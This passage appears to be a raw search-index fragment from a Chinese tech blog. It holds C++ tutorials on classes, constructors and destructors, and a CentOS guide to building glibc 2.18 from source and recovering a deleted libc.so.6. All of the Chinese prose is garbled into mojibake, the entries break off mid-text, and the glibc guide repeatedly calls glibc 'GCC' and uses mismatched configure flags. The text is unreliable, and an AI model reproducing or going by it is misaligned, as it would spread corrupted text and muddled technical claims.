//è¿”å›ä¸€ä¸ªå¼•ç”¨ï¼Œç›¸å½“äºè¿”å›è‡ªèº« //è¿”å›t1è¿™ä¸ªå…ƒç´ ï¼Œthiså°±æ˜¯&amp;t1 Test&amp; testAdd2(Test&amp; t2) { this-&gt;a = this-&gt;a + t2.a; this-&gt;b = this-&gt;b + t2.b; return *this; //æŠŠ *(&amp;t1) åˆå›åˆ°äº† t1å…ƒç´  }};// å…¨å±€å‡½æ•°Test testAdd(Test&amp; t1, Test&amp; t2){ Test tmp; tmp.a = t1.a + t2.a; tmp.b = t1.b + t2.b; return tmp;}// å…¨å±€å‡½æ•°void printT(Test* pT){ cout &lt;&lt; "a:" &lt;&lt; pT-&gt;a &lt;&lt; " b: " &lt;&lt; pT-&gt;b &lt;&lt; endl;}int main(){ Test t1(1, 2); Test t2(3, 4); // è°ƒç”¨å…¨å±€å‡½æ•° Test t3; t3 = testAdd(t1, t2); printT(&amp;t3); // è°ƒç”¨æˆå‘˜å‡½æ•° Test t4 = t1.testAdd(t2); // å°†åŒ¿åå¯¹è±¡ç›´æ¥è½¬åŒ–æˆt4 t4.printT(); Test t5; t5 = t1.testAdd(t2); // å°†åŒ¿åå¯¹è±¡å¤åˆ¶ç»™t5 t5.printT(); t1.testAdd2(t2); // å‡½æ•°å†…éƒ¨ä½¿ç”¨äº†thisæŒ‡é’ˆ t1.printT(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a:4 b: 6a:4 b: 6a:4 b: 6a:4 b: 6 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Linux è§£å†³ libc.so.6 version GLIBC_2.18 not found çš„é—®é¢˜",url:"/posts/15a7083d.html",text:'é”™è¯¯æ—¥å¿—ä¿¡æ¯ 1/lib64/libc.so.6: version \'GLIBC_2.18\' not found ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.9.2009 (Core)Linux 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux æŸ¥çœ‹å½“å‰ GLIBC çš„ç‰ˆæœ¬ 123456789101112131415161718192021# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17 é—®é¢˜åˆ†æ é€šè¿‡æŸ¥çœ‹å½“å‰ GLIBC çš„ç‰ˆæœ¬ï¼Œå¯ä»¥å‘ç°ç›®å‰ç³»ç»Ÿä¸­æœ€é«˜åªæ”¯æŒ GLIBC_2.17ï¼Œå½“éœ€è¦å®‰è£…ä¾èµ– GLIBC_2.18 çš„è½¯ä»¶æ—¶ï¼Œå°±ä¼šå‡ºç° libc.so.6: version \'GLIBC_2.18\' not found çš„é”™è¯¯ä¿¡æ¯ã€‚glibc æ˜¯ GNU å‘å¸ƒçš„ libc åº“ï¼Œå³ C è¿è¡Œåº“ã€‚glibc æ˜¯ Linux ç³»ç»Ÿä¸­æœ€åº•å±‚çš„ APIï¼Œå‡ ä¹å…¶å®ƒä»»ä½•è¿è¡Œåº“éƒ½ä¼šä¾èµ–äº glibcã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œglibc é™¤äº†å°è£…äº† Linux æ“ä½œç³»ç»Ÿæ‰€æä¾›çš„ç³»ç»ŸæœåŠ¡å¤–ï¼Œå®ƒæœ¬èº«ä¹Ÿæä¾›äº†è®¸å¤šå…¶å®ƒä¸€äº›å¿…è¦åŠŸèƒ½æœåŠ¡çš„å®ç°ã€‚å¯¹äº CentOS è¿™æ ·çš„ç³»ç»Ÿï¼Œä¸ºäº†è¿½æ±‚ç¨³å®šæ€§ï¼ˆè¿™ä¸ªå€¼å¾—å•†æ¦·ï¼‰å¾€å¾€å„ç§åº“ç‰ˆæœ¬éƒ½å¾ˆä½ï¼Œæ¯”å¦‚ CentOS 6.5 ç”šè‡³ CentOS 7.0 è‡ªå¸¦çš„è¿˜æ˜¯ glibc 2.12, è€Œ Ubuntu 14.04 è‡ªå¸¦ glibc2.19ã€‚å¦‚æœå‡çº§ glibc åˆ°ä¸€ä¸ªå¤ªæ–°çš„ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šå½±å“ CentOS çš„ç¨³å®šè¿è¡Œï¼Œæ‰€ä»¥ä¸å»ºè®®éšä¾¿å‡çº§ glibc çš„ç‰ˆæœ¬ã€‚ è§£å†³æ€è·¯ a) æ‰‹åŠ¨ç¼–è¯‘å®‰è£…é«˜ç‰ˆæœ¬çš„ gcc b) åœ¨ä½ç‰ˆæœ¬çš„ç³»ç»Ÿç¼–è¯‘è‡ªå·±çš„è½¯ä»¶ï¼Œå‰ææ˜¯è‡ªå·±çš„è½¯ä»¶ç¡®å®ä¸éœ€è¦ä½¿ç”¨æ–°ç‰ˆ GCC æ‰æ”¯æŒçš„ç‰¹æ€§ c) åˆ©ç”¨å®¹å™¨æŠ€æœ¯ï¼ˆå¦‚ Dockerï¼‰ï¼Œåœ¨ä½ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿå†…ï¼Œè½»é‡çº§çš„éš”ç¦»å‡ºä¸€ä¸ªè™šæ‹Ÿè¿è¡Œç¯å¢ƒï¼Œé€‚åº”è‡ªå·±çš„è½¯ä»¶ (adsbygoogle = window.adsbygoogle || []).push({}); ç¼–è¯‘å®‰è£… GCC glibc çš„å„ä¸ªç‰ˆæœ¬å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œåœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ï¼Œå¼ºçƒˆå»ºè®®åœ¨æ‰§è¡Œä¸‹è¿°çš„ make install å‘½ä»¤ä¹‹å‰ï¼Œå…¨é‡å¤‡ä»½æ•´ä¸ª Linux ç³»ç»Ÿï¼Œé˜²æ­¢å› ç³»ç»Ÿæ–‡ä»¶æ„å¤–è¢«ç ´åï¼Œå¯¼è‡´ç³»ç»Ÿåœ¨å¯åŠ¨æˆ–è¿è¡ŒæœŸé—´å‡ºç°å´©æºƒçš„é—®é¢˜ã€‚ 1234567891011121314151617181920212223# ä¸‹è½½glibc-2.18# curl -O http://ftp.gnu.org/gnu/glibc/glibc-2.18.tar.gz# è§£å‹æ–‡ä»¶# tar zxf glibc-2.18.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd glibc-2.18# å»ºç«‹è¾“å‡ºç›®å½•ï¼Œç”¨äºå­˜æ”¾ç¼–è¯‘æ—¶æ‰€æœ‰äº§ç”Ÿçš„ä¸­é—´æ–‡ä»¶# mkdir build# è¿›å…¥è¾“å‡ºç›®å½•# cd build# æ‰§è¡Œé…ç½®# ../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --enable-checking=release --enable-languages=c,c++# ç¼–è¯‘GCCï¼ŒæŒ‡å®šç¼–è¯‘ä½¿ç”¨çš„çº¿ç¨‹æ•°ä¸º8ï¼Œç¼–è¯‘è€—æ—¶è¾ƒé•¿# make -j8# å®‰è£…GCCï¼ˆåˆ‡è®°è°¨æ…æ‰§è¡Œï¼‰# make install éªŒè¯ GCC çš„ç‰ˆæœ¬æ˜¯å¦å‡çº§æˆåŠŸ å¦‚æœåœ¨ä¸‹é¢çš„è¾“å‡ºç»“æœä¸­ï¼Œå‡ºç° GLIBC_2.18ï¼Œåˆ™ä»£è¡¨ GCC çš„ç‰ˆæœ¬å‡çº§æˆåŠŸã€‚ 12345678910111213141516171819202122# strings /lib64/libc.so.6 | grep GLIBCGLIBC_2.2.5GLIBC_2.2.6GLIBC_2.3GLIBC_2.3.2GLIBC_2.3.3GLIBC_2.3.4GLIBC_2.4GLIBC_2.5GLIBC_2.6GLIBC_2.7GLIBC_2.8GLIBC_2.9GLIBC_2.10GLIBC_2.11GLIBC_2.12GLIBC_2.13GLIBC_2.14GLIBC_2.15GLIBC_2.16GLIBC_2.17GLIBC_2.18 æˆ–è€…æŸ¥çœ‹ ldd çš„ç‰ˆæœ¬ 12345# ldd --versionldd (GNU libc) 2.18Copyright (C) 2013 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. æˆ–è€…æŸ¥çœ‹ç³»ç»Ÿçš„åº“æ–‡ä»¶ 123456789# æŸ¥çœ‹ç³»ç»Ÿçš„libc.soåº“æ–‡ä»¶# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10æœˆ 14 02:29 /usr/lib64/libc-2.17.so-rwxr-xr-x. 1 root root 10232696 10æœˆ 24 14:52 /usr/lib64/libc-2.18.so# æŸ¥çœ‹ç³»ç»Ÿçš„libc.soåº“æ–‡ä»¶# ls /usr/lib64/libc.so* -al-rw-r--r--. 1 root root 253 10æœˆ 24 14:51 /usr/lib64/libc.solrwxrwxrwx. 1 root root 12 10æœˆ 24 14:52 /usr/lib64/libc.so.6 -&gt; libc-2.18.so è§£å†³è¯¯åˆ  libc.so.6 åº“æ–‡ä»¶çš„é—®é¢˜ åœ¨ä¸Šè¿°çš„æ“ä½œä¸­ï¼Œè‹¥è¯¯åˆ äº† libc.so.6 åº“æ–‡ä»¶ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿå¤§å¤šæ•°å‘½ä»¤ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼šlsã€cpã€lnï¼‰ã€‚æ­¤æ—¶åƒä¸‡ä¸è¦éšä¾¿é‡å¯ç³»ç»Ÿï¼Œç¼ºå°‘ libc.so.6 åº“æ–‡ä»¶å¾ˆå®¹æ˜“å¯¼è‡´ç³»ç»Ÿæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œå…¶æ¬¡ä¹Ÿå°½é‡ä¸è¦å…³é—­æ­£åœ¨è¿è¡Œçš„ç»ˆç«¯ï¼Œå› ä¸ºå¾ˆå¤šä¸œè¥¿è¿˜å¯ä»¥è¡¥æ•‘ï¼Œå»ºè®®å‚è€ƒä»¥ä¸‹æ­¥éª¤é‡æ–°åˆ›å»º libc.so.6 åº“æ–‡ä»¶ã€‚ 123456789101112# æŸ¥çœ‹ç³»ç»Ÿå¯ç”¨çš„libcåº“æ–‡ä»¶# ls /usr/lib64/libc-*.so -al-rwxr-xr-x. 1 root root 2156592 10æœˆ 14 02:29 /usr/lib64/libc-2.17.so# é€šè¿‡ç³»ç»Ÿç¯å¢ƒå˜é‡LD_PRELOADå¯¼å…¥å¯ç”¨çš„libcåº“æ–‡ä»¶# export LD_PRELOAD=/usr/lib64/libc-2.17.so# åˆ©ç”¨å¯ç”¨çš„libcåº“æ–‡ä»¶ï¼Œåˆ›å»ºæ–°çš„libc.so.6åº“æ–‡ä»¶# ln -s -f /usr/lib64/libc-2.17.so /usr/lib64/libc.so.6# å–æ¶ˆè®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡LD_PRELOAD# unset LD_PRELOAD å‚è€ƒåšå®¢ Linuxï¼ˆCentOSï¼‰GLIBC å‡ºé”™çš„è¡¥æ•‘æ–¹å¼ è§£å†³ libc.so.6: version â€˜GLIBC_2.18â€™ not found çš„é—®é¢˜ Linux/Centos ä¸‹ /lib64/libc.so.6: version â€˜GLIBC_2.14â€™ not found var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹å››",url:"/posts/beb2ebb3.html",text:'å­¦ä¹ ç›®æ ‡ C++ é¢å‘å¯¹è±¡çš„åŸºç¡€æ¨¡å‹ C++ ç¼–è¯‘å™¨ç®¡ç†ç±»å’Œå¯¹è±¡çš„æœºåˆ¶ C++ ç¼–è¯‘å™¨å¯¹ç±»å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒ…æ‹¬å¯¹è±¡çš„åˆ›å»ºã€ä½¿ç”¨ã€é”€æ¯ç­‰ ç±»å’Œå¯¹è±¡åŸºæœ¬æ¦‚å¿µ a) ç±»ã€å¯¹è±¡ã€æˆå‘˜å˜é‡ã€æˆå‘˜å‡½æ•° b) é¢å‘å¯¹è±¡ä¸‰å¤§æ¦‚å¿µï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€ ç±»çš„å°è£…å°è£…ï¼ˆEncapsulationï¼‰ï¼š a) å°è£…ï¼Œæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡æœ€åŸºæœ¬çš„ç‰¹æ€§ã€‚æŠŠæ•°æ®ï¼ˆå±æ€§ï¼‰å’Œå‡½æ•°ï¼ˆæ“ä½œï¼‰åˆæˆä¸€ä¸ªæ•´ä½“ï¼Œå¯¹æ•°æ®å’Œå‡½æ•°è¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œè¿™åœ¨è®¡ç®—æœºä¸–ç•Œä¸­æ˜¯ç”¨ç±»ä¸å¯¹è±¡å®ç°çš„ã€‚ b) å°è£…ï¼ŒæŠŠå®¢è§‚äº‹ç‰©å°è£…æˆæŠ½è±¡çš„ç±»ï¼Œå¹¶ä¸”ç±»å¯ä»¥æŠŠè‡ªå·±çš„æ•°æ®å’Œæ–¹æ³•åªè®©å¯ä¿¡çš„ç±»æˆ–è€…å¯¹è±¡æ“ä½œï¼Œå¯¹ä¸å¯ä¿¡çš„è¿›è¡Œä¿¡æ¯éšè—ã€‚ C++ ä¸­ç±»çš„å°è£…ï¼š æˆå‘˜å˜é‡ï¼šC++ ä¸­ç”¨äºè¡¨ç¤ºç±»å±æ€§çš„å˜é‡ æˆå‘˜å‡½æ•°ï¼šC++ ä¸­ç”¨äºè¡¨ç¤ºç±»è¡Œä¸ºçš„å‡½æ•° ç±»æˆå‘˜çš„è®¿é—®æ§åˆ¶åœ¨ C++ ä¸­å¯ä»¥ç»™æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°å®šä¹‰è®¿é—®çº§åˆ«ï¼š privateï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨è¢«è®¿é—® publicï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥åœ¨ç±»çš„å†…éƒ¨å’Œç±»çš„å¤–éƒ¨è¢«è®¿é—® protectedï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥åœ¨æ´¾ç”Ÿç±»ï¼ˆç»§æ‰¿çš„å­ç±»ï¼‰çš„å†…éƒ¨è®¿é—®ï¼Œä¸èƒ½åœ¨æ´¾ç”Ÿç±»çš„å¤–éƒ¨è¢«è®¿é—® ç‰¹åˆ«æ³¨æ„ï¼šè‹¥åœ¨ç±»ä¸­æ²¡æœ‰å£°æ˜è®¿é—®æ§åˆ¶çº§åˆ«çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œé»˜è®¤éƒ½æ˜¯ private è®¿é—®çº§åˆ«çš„ åŸºäºç±»æˆå‘˜çš„è®¿é—®æ§åˆ¶ï¼Œè®¡ç®—åœ†å½¢é¢ç§¯çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // åœ†å½¢çš„åŠå¾„ double m_s; // åœ†å½¢çš„é¢ç§¯public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "è¯·è¾“å…¥åœ†å½¢çš„åŠå¾„ï¼š"; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "åœ†å½¢çš„é¢ç§¯æ˜¯ï¼š" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} struct å’Œ class çš„åŒºåˆ«struct å’Œ class å…³é”®å­—çš„åŒºåˆ«å¦‚ä¸‹ï¼š åœ¨ç”¨ class å®šä¹‰ç±»æ—¶ï¼Œæ‰€æœ‰æˆå‘˜çš„é»˜è®¤å±æ€§ä¸º private åœ¨ç”¨ struct å®šä¹‰ç±»æ—¶ï¼Œæ‰€æœ‰æˆå‘˜çš„é»˜è®¤å±æ€§ä¸º public ç±»çš„å£°æ˜ä¸ç±»çš„å®ç°ä¸€èµ·å†™123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {private: double m_r; // åœ†å½¢çš„åŠå¾„ double m_s; // åœ†å½¢çš„é¢ç§¯public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "è¯·è¾“å…¥åœ†å½¢çš„åŠå¾„ï¼š"; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "åœ†å½¢çš„é¢ç§¯æ˜¯ï¼š" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12è¯·è¾“å…¥åœ†å½¢çš„åŠå¾„ï¼š30åœ†å½¢çš„é¢ç§¯æ˜¯ï¼š2826 ç±»çš„å£°æ˜ä¸ç±»çš„å®ç°åˆ†å¼€å†™åœ¨ä¼ä¸šå¼€å‘ä¸­ï¼Œç”±äºé¡¹ç›®ç»“æ„æ¯”è¾ƒåºå¤§ï¼Œä¸€èˆ¬éƒ½ä¼šå°†ç±»çš„å£°æ˜å’Œç±»çš„å®ç°åˆ†å¼€å†™åœ¨ä¸åŒçš„æºæ–‡ä»¶ä¸­ã€‚ Teacher.h å¤´æ–‡ä»¶ï¼Œå£°æ˜äº† Teacher ç±»çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼›ä½¿ç”¨ #ifndefã€#defineã€#endif æŒ‡ä»¤ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢ Teacher.h å¤´æ–‡ä»¶è¢«å¤šæ¬¡å¼•ç”¨æ—¶ C++ ç¼–è¯‘å™¨ç¼–è¯‘å¤±è´¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ #pragma once æŒ‡ä»¤æ¥æ›¿ä»£ã€‚ 1234567891011121314151617181920#ifndef TEACHER_H#define TEACHER_Hclass Teacher {private: char *_name; int _age;public: const char *getName() const; void setName(char *name); int getAge() const; void setAge(int age);};#endif Teacher.cpp æºæ–‡ä»¶ï¼Œå®ç°äº†åœ¨ Teacher.h å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„æˆå‘˜å‡½æ•° 1234567891011121314151617181920#include &lt;iostream&gt;#include "Teacher.h"using namespace std;const char *Teacher::getName() const { return this-&gt;_name;}void Teacher::setName(char *name) { this-&gt;_name = name;}int Teacher::getAge() const { return this-&gt;_age;}void Teacher::setAge(int age) { this-&gt;_age = age;} Main.cpp æºæ–‡ä»¶ 12345678910111213#include &lt;iostream&gt;#include "Teacher.h"using namespace std;int main() { char name[32] = "Peter"; Teacher teacher; teacher.setAge(10); teacher.setName(name); cout &lt;&lt; "age: " &lt;&lt; teacher.getAge() &lt;&lt; endl; cout &lt;&lt; "name: " &lt;&lt; teacher.getName() &lt;&lt; endl;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12age: 10name: Peter å¯¹è±¡çš„æ„é€ å’Œææ„ææ„å‡½æ•°ææ„å‡½æ•°çš„å®šä¹‰ææ„å‡½æ•°çš„å®šä¹‰ï¼š C++ ä¸­çš„ç±»å¯ä»¥å®šä¹‰ä¸€ä¸ªç‰¹æ®Šçš„æˆå‘˜å‡½æ•°æ¥æ¸…ç†å¯¹è±¡ï¼Œè¿™ä¸ªç‰¹æ®Šçš„æˆå‘˜å‡½æ•°å«åšææ„å‡½æ•° ææ„å‡½æ•°çš„åç§°ä¸ç±»çš„åç§°æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œåªæ˜¯åœ¨å‰é¢åŠ äº†ä¸ªæ³¢æµªå· ~ ä½œä¸ºå‰ç¼€ï¼Œå®ƒæ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•è¿”å›ç±»å‹çš„å£°æ˜ ææ„å‡½æ•°æœ‰åŠ©äºåœ¨è·³å‡ºç¨‹åºï¼ˆæ¯”å¦‚å…³é—­æ–‡ä»¶ã€é‡Šæ”¾å†…å­˜ç­‰ï¼‰å‰é‡Šæ”¾èµ„æº ææ„å‡½æ•°åœ¨å¯¹è±¡é”€æ¯æ—¶ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ ææ„å‡½æ•°çš„è°ƒç”¨ï¼š C++ ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•° ææ„å‡½æ•°çš„å£°æ˜12345678910111213141516171819#include &lt;iostream&gt;using namespace std;class Teacher {public: // ææ„å‡½æ•° ~Teacher() { cout &lt;&lt; "è°ƒç”¨ææ„å‡½æ•°" &lt;&lt; endl; }};int main() { Teacher teacher; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1è°ƒç”¨ææ„å‡½æ•° æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå¸¸å¸¸éœ€è¦åšæŸäº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œä¾‹å¦‚å¯¹æ•°æ®æˆå‘˜èµ‹åˆå€¼ã€‚å¿…é¡»æ³¨æ„ï¼Œç±»çš„æ•°æ®æˆå‘˜æ˜¯ä¸èƒ½åœ¨å£°æ˜ç±»æ—¶åˆå§‹åŒ–çš„ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++ ç¼–è¯‘å™¨æä¾›äº†æ„é€ å‡½æ•°ï¼ˆConstructorï¼‰æ¥å¤„ç†å¯¹è±¡çš„åˆå§‹åŒ–ã€‚æ„é€ å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œä¸å…¶ä»–æˆå‘˜å‡½æ•°ä¸åŒï¼Œä¸éœ€è¦ç”¨æˆ·æ¥è°ƒç”¨å®ƒï¼Œè€Œæ˜¯åœ¨å»ºç«‹å¯¹è±¡æ—¶è‡ªåŠ¨è¢«è°ƒç”¨ã€‚ æ„é€ å‡½æ•°çš„å®šä¹‰æ„é€ å‡½æ•°çš„å®šä¹‰ï¼š C++ ä¸­çš„ç±»å¯ä»¥å®šä¹‰ä¸ç±»åç›¸åŒçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œè¿™ç§ä¸ç±»åç›¸åŒçš„æˆå‘˜å‡½æ•°å«åšæ„é€ å‡½æ•° æ„é€ å‡½æ•°åœ¨å®šä¹‰æ—¶å¯ä»¥æœ‰å‚æ•° æ„é€ å‡½æ•°æ²¡æœ‰ä»»ä½•è¿”å›ç±»å‹çš„å£°æ˜ æ„é€ å‡½æ•°å¯ç”¨äºä¸ºæŸäº›æˆå‘˜å˜é‡è®¾ç½®åˆå§‹å€¼ æ„é€ å‡½æ•°çš„è°ƒç”¨ï¼š è‡ªåŠ¨è°ƒç”¨ï¼šä¸€èˆ¬æƒ…å†µä¸‹ C++ ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•° æ‰‹åŠ¨è°ƒç”¨ï¼šåœ¨ä¸€äº›ç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œéœ€è¦æ‰‹å·¥è°ƒç”¨æ„é€ å‡½æ•° æ„é€ å‡½æ•°çš„åˆ†ç±»æ„é€ å‡½æ•°ä¸€èˆ¬åˆ†ä¸ºä¸‰ç±»ï¼šæ— å‚æ•°çš„æ„é€ å‡½æ•°ã€å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ï¼ˆèµ‹å€¼æ„é€ å‡½æ•°ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: // æ— å‚æ•°çš„æ„é€ å‡½æ•° Test() { _a = 1; _b = 2; } // å¸¦å‚æ•°çš„æ„é€ å‡½æ•° Test(int a, int b) { _a = a; _b = b; } // æ‹·è´æ„é€ å‡½æ•°ï¼ˆèµ‹å€¼æ„é€ å‡½æ•°ï¼‰ Test(const Test &amp;obj) { _a = obj._a; _b = obj._b; }}; é»˜è®¤çš„æ„é€ å‡½æ•°C++ ä¸­æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„æ„é€ å‡½æ•°ï¼š é»˜è®¤æ— å‚æ„é€ å‡½æ•°ï¼šå½“ç±»ä¸­æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨é»˜è®¤ä¼šæä¾›ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”å…¶å‡½æ•°ä½“ä¸ºç©º é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼šå½“ç±»ä¸­æ²¡æœ‰å®šä¹‰æ‹·è´æ„é€ å‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨é»˜è®¤ä¼šæä¾›ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•°ï¼Œç”¨äºç®€å•åœ°è¿›è¡Œç±»æˆå‘˜å˜é‡çš„å€¼å¤åˆ¶ æ„é€ å‡½æ•°çš„è°ƒç”¨æ–¹å¼æ„é€ å‡½æ•°çš„è°ƒç”¨æ–¹å¼åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;class Test {private: int _a; int _b;public: Test() { _a = 1; _b = 1; } Test(int a) { _a = a; _b = 3; } Test(int a, int b) { _a = a; _b = b; }public: int getA() const { return _a; } int getB() const { return _b; }};int main() { // ç¬¬ä¸€ç§ï¼šC++ç¼–è¯‘å™¨è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°(ç­‰å·æ³•) Test t1 = (1, 2, 3, 4, 5); printf("a = %d, b = %d\\n", t1.getA(), t1.getB()); // ç¬¬äºŒç§ï¼šC++ç¼–è¯‘å™¨è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°(æ‹¬å·æ³•) Test t2(10, 20); printf("a = %d, b = %d\\n", t2.getA(), t2.getB()); // C++ç¼–è¯‘å™¨è°ƒç”¨æ— å‚æ„é€ å‡½æ•° Test t0; printf("a = %d, b = %d\\n", t0.getA(), t0.getB()); // ç¬¬ä¸‰ç§ï¼šæ‰‹åŠ¨è°ƒç”¨æ„é€ å‡½æ•°ç”Ÿæˆä¸€ä¸ªå¯¹è±¡(ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°æ³•) Test t3 = Test(100, 200); printf("a = %d, b = %d\\n", t3.getA(), t3.getB()); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a = 5, b = 3a = 10, b = 20a = 1, b = 1a = 100, b = 200 æ‹·è´æ„é€ å‡½æ•°çš„è°ƒç”¨åœºæ™¯ç¬¬ä¸€ç§è°ƒç”¨åœºæ™¯123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "æ— å‚æ„é€ å‡½æ•°è‡ªåŠ¨è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test 